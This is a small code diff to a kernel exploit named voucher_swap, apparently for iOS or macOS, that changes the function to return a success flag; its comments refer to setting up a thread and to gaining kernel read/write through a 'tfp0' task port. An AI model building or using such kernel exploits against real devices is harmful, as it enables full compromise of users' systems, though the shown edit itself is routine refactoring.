@@ -738,16 +738,15 @@ clean_up(mach_port_t dangling_voucher, uint64_t ip_requests,
 
 // ---- Exploit -----------------------------------------------------------------------------------
 
-void
+bool
 voucher_swap() {
 	kern_return_t kr;
 	host = mach_host_self();
 	mach_port_t thread;
 
 	// Initialize parameters and offsets for the exploit.
-	bool ok = parameters_init();
-	if (!ok) {
-		fail();
+	if (!parameters_init()) {
+        return false;
 	}
 
 	// 1. Create the thread whose ith_voucher field we will use during the exploit. This could
@@ -1137,4 +1136,5 @@ voucher_swap() {
 
 	// And that's it! Enjoy kernel read/write via kernel_task_port.
 	INFO("done! port 0x%x is tfp0", kernel_task_port);
+    return true;
 }
